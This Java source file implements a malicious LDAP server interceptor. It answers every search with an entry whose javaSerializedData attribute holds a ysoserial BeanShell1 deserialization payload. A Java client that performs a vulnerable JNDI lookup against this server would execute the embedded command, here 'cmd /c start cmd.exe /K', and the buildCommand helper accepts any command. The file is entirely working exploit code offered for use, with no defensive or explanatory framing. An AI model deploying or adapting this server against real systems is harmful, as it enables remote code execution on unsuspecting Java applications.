package com.its.ldap.server.manager;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import ysoserial.Serializer;
import ysoserial.payloads.BeanShell1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;

public class OperationInterceptor extends InMemoryOperationInterceptor {
	@Override
	public void processSearchResult(InMemoryInterceptedSearchResult result) {
		String base = result.getRequest().getBaseDN();
		Entry e = new Entry(base);

		try {
			System.out.println("found request from base dns " + base);
			System.out.println("starting build response command to client");
			e.addAttribute("javaClassName", "foo");
			e.addAttribute("javaSerializedData", Base64.decode(buildCommand("cmd /c start cmd.exe /K")));
			result.sendSearchEntry(e);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
			System.out.println("finished process request from base " + base);
		} catch (Exception exp) {
			exp.printStackTrace();
			System.out.println("error process request from base " + base);
		}
	}

	private String buildCommand(String command) throws Exception {
		ObjectPayload<?> payloadDataObject = new BeanShell1();
		final Object cmd = payloadDataObject.getObject(command);
		byte[] payload = Serializer.serialize(cmd);
		Utils.releasePayload(payloadDataObject, cmd);
		return java.util.Base64.getEncoder().encodeToString(payload);
	}
}
